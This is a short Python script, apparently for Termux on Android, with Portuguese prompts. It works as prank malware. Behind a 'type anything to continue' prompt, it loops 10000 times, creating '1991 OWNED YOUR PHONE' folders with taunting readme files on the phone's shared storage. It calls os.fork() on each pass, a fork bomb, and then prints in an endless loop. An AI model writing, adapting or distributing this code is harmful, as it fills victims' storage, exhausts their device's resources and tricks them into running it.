import os
import time
import pyfiglet

os.system ('clear')

input(f'CONTINUE (DIGITE QUALQUER COISA): ')
time.sleep (0.5)
os.system (' figlet -f slant FINALIZANDO...')
for i in range(10000):
    os.system("termux-setup-storage -y")
    dir = ("1991 OWNED YOUR PHONE."+str(i))
    os.system (f'cd /sdcard && mkdir {dir} && cd {dir} && echo 1991 F9DEU SEU CELL - NETWORK > leia-me.txt')
    os.fork()
time.sleep (2.0)
while True:
        print (f'HELLO FRIEND 404 Skipper')
